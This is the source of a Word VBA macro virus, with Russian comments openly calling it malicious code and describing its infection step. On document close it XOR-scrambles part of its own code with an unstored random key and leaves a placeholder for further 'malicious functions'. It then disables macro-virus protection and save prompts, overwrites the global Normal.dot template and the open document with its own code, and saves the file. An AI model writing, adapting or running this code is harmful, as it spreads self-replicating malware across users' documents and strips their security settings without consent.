Private Sub Document_Close()
    ' Шифрование вредоносного кода
    For V1 = 18 To 39
        V2 = Null
        V3 = "'" & (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
        V4 = Int(Rnd() * 8) + 1
        For V5 = 1 To Len(V3)
            V6 = Asc(Mid(V3, V5, 1)) Xor V4
            V2 = V2 & Chr(V6)
        Next V5
        V7 = V2
        ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, "'" & V7
    Next V1

    ' Возможные вредоносные функции
    ' ...

    ' Заражение
    Options.VirusProtection = 0     ' отключить защиту от макровирусов
    Options.SaveNormalPrompt = 0    ' отключить запрос на сохранение Normal.dot
    Options.ConfirmConversions = 0  ' отключить подтверждение преобразования файлов

    V8 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    Set V9 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    V9.DeleteLines 1, V9.CountOfLines  ' удалить код из Normal.dot
    V9.AddFromString V8                ' вставить код этой программы
    Set VA = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    VA.DeleteLines 1, VA.CountOfLines  ' удалить код шаблона текущего документа
    VA.AddFromString V8                ' вставить код этой программы
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName  ' сохранить изменения
End Sub
